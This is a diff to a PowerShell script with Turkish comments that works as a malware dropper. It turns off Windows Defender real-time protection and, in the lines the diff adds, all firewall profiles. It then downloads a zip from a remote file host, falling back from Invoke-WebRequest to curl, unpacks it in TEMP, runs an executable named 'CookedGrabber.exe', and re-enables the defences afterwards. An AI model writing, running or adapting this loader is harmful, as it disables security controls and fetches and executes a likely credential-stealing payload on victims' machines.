@@ -1,15 +1,20 @@
-# Gerçek zamanlı korumayı geçici olarak devre dışı bırak
+# GERÇEK ZAMANLI KORUMAYI KAPAT
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+# GÜVENLİK DUVARLARINI KAPAT
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+# === AYARLAR ===
 $zipUrl = "https://phs8.krakencloud.net/force-download/YTVlZDUyNmFjMjM0ODljMEdJkIYYNXKlh90AQUmTDQePnkgZwCY0DknElozHjF3N/nhRWBTtepD"
 $zipPath = "$env:TEMP\bot.zip"
 $extractPath = "$env:TEMP\cikartilan"
 $exeName = "CookedGrabber.exe"
 
-# Önceki dosyaları temizle
+# TEMİZLİK
 Remove-Item $zipPath -ErrorAction SilentlyContinue
 Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
 
+# ZIP ÇIKARMA
 function Try-ExtractZip {
     param ($path)
     try {
@@ -21,7 +26,7 @@ function Try-ExtractZip {
     }
 }
 
-# ZIP dosyasını indirmeyi dene (sessizce)
+# DOSYAYI İNDİR
 try {
     Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
 } catch {
@@ -30,11 +35,11 @@ try {
     } catch {
         try {
             curl.exe -L $zipUrl -o $zipPath
-        } catch { }
+        } catch {}
     }
 }
 
-# Eğer ZIP varsa, çıkar ve çalıştır
+# ÇIKAR VE ÇALIŞTIR
 if (Test-Path $zipPath) {
     if (!(Test-Path $extractPath)) {
         New-Item -ItemType Directory -Path $extractPath | Out-Null
@@ -48,5 +53,8 @@ if (Test-Path $zipPath) {
     }
 }
 
-# Gerçek zamanlı korumayı geri aç
+# GERÇEK ZAMANLI KORUMAYI GERİ AÇ
 Set-MpPreference -DisableRealtimeMonitoring $false
+
+# GÜVENLİK DUVARLARINI GERİ AÇ
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
